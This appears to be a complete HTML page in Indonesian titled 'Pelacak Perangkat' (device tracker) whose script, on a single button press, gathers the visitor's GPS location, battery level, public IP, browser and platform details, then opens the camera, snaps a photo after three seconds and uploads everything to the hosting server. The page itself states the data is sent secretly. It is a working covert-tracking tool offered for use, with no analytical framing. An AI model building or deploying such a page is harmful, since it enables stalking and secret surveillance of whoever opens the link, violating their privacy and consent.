<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pelacak Perangkat</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
        }
        .container {
            margin-top: 50px;
            padding: 20px;
            background: white;
            display: inline-block;
            border-radius: 10px;
            box-shadow: 0px 0px 10px gray;
        }
        button {
            padding: 10px 20px;
            font-size: 18px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #218838;
        }
    </style>
    <script>
        function startTracking() {
            getLocation();
            getBattery();
            getIP();
            getDeviceInfo();
            getCamera();
        }

        function sendData(data) {
            fetch("/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    sendData({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                });
            }
        }

        function getBattery() {
            navigator.getBattery().then(battery => {
                sendData({ battery: battery.level * 100 + "%" });
            });
        }

        function getIP() {
            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => sendData({ ip: data.ip }));
        }

        function getDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };
            sendData(deviceInfo);
        }

        function getCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        takePicture(video);
                        stream.getTracks().forEach(track => track.stop());
                    }, 3000);
                })
                .catch(err => console.error("Akses kamera ditolak!", err));
        }

        function takePicture(video) {
            let canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            let ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("image", blob);
                fetch("/upload", { method: "POST", body: formData });
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Pelacak Perangkat</h1>
        <button onclick="startTracking()">Mulai</button>
        <p>Data akan dikirim diam-diam ke server</p>
    </div>
</body>
</html>
